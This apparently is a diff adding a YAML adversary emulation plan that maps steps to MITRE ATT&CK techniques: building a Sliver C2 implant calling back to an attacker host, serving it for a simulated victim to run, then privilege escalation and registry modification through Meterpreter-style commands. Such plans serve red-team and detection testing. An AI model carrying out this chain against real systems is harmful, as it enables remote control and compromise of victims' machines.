@@ -1,0 +1,148 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-07 23:41:00 UTC+0000
+attack_action_sequence:
+  - uuid: 0e67b73a-9927-43e1-8f64-04d38f1db57d
+    name: Build Sliver implant
+    id: T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+        sliver > mlts --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        type:
+  - uuid: 4a31f8db-89db-4f16-baab-47bb3f9d5b8a
+    name: Simulate the victim download and execute malicious payload file
+    id: T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique: |
+      User Execution: Malicious File
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{PATH}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        type:
+  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
+    name: Execute a Sliver Implant Payload
+    id: T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+  - uuid: 5a1d2b9f-4e7f-8a4d-3f7a-6c2e5e9f9f7c
+    name: Privilege Escalation
+    id:
+      - T1134
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Privilege Escalation
+    technique: |
+      Access Token Manipulation
+    description: The `get_system` command attempts to gain SYSTEM-level privileges.
+    execution:
+      executor: Meterpreter Executor
+      command: get_system (#{hosting_process},#{config},#{SessionID})
+    arguments:
+      hosting_process:
+        description: Target process ID or name for privilege escalation
+      config:
+        description: Configuration options for escalation method
+        default: Service
+      SessionID:
+        description: The session ID of the active Sliver connection.
+  - uuid: 2d3c5f1e-4a7c-b6d4-2e8f-1a9c0b5e9a8b
+    name: Registry Modification
+    id:
+      - T1112
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Defense Evasion
+    technique: |
+      Modify Registry
+    description: The `registry_write` command modifies Windows registry values.
+    execution:
+      executor: Meterpreter Executor
+      command: registry_write 
+        (#{hive},#{reg_path},#{key},#{hostname},#{string_value},#{byte_value},#{dword_value},#{qword_value},#{reg_type},#{SessionID})
+    arguments:
+      hive:
+        description: Registry hive (HKLM/HKCU/HKU)
+      reg_path:
+        description: Path to registry key
+      key:
+        description: Value name to modify
+      hostname:
+        description: Target hostname for remote registry access
+      string_value:
+        description: String value data
+      byte_value:
+        description: Binary value data (hex format)
+      dword_value:
+        description: 32-bit integer value
+      qword_value:
+        description: 64-bit integer value
+      reg_type:
+        description: Registry value type (REG_SZ/REG_BINARY/REG_DWORD/REG_QWORD)
+      SessionID:
+        description: The session ID of the active Sliver connection.
+testbed_requirement:
+  OS: []
+  CVE: []
